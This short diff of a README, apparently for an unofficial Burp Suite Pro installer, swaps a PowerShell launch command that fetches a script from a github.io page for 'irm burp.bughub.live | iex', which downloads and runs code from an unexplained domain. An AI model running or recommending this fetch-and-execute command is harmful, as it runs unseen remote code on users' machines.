@@ -12,7 +12,7 @@ https://github.com/padsalatushal/Burp-Suite-Pro-Installer/assets/57517785/0159ee
 
 Launch Command (Powershell) :
 ```bash
-irm https://padsalatushal.github.io/burp_setup.ps1 | iex
+irm burp.bughub.live | iex
 ```
 Or
 
